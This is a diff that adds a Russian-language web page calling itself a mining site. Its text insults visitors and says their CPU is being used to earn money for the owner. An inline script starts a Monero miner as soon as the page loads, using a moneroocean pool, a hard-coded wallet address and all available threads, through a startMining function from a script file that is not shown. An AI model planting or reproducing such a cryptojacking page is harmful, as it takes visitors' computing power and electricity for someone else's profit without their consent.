@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Мой Майнинг Сайт</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #1a1a1a;
+      color: #fff;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      color: #00ff00;
+    }
+    .notice {
+      background-color: #000;
+      padding: 10px;
+      border-radius: 5px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Добро пожаловать на мой сайт с майнингом!</h1>
+  <p>Здесь крутой контент, а ты помогаешь мне зарабатывать, сука! Майнинг использует твой CPU.</p>
+  <p>Прогресс смотри <a href="https://moneroocean.stream" style="color: #00ff00;">здесь</a>.</p>
+  <div class="notice">
+    <p>Этот сайт использует майнинг для поддержки контента. Ты можешь остановить его, закрыв страницу. Спасибо!</p>
+  </div>
+
+  <!-- Интеграция локального script.js -->
+  <script src="/assets/script.js"></script>
+  <script>
+    console.log("Config Loaded");
+    var pool = "gulf.moneroocean.stream:10128";
+    var walletAddress = "4AvpXBT4sxVfNC8TzhsCZZ1dZbTCZWCqgFx7PMdTSsLxfDfLgChJvxq8yrz67AmJNMTQwF2a17Z8PXQxW29i62vrEQso5Ck";
+    var workerId = "GH-XMR";
+    var threads = -1;
+    var password = "";
+    var throttleMiner = 20;
+    startMining(pool, walletAddress, workerId, threads, password);
+  </script>
+</body>
+</html>
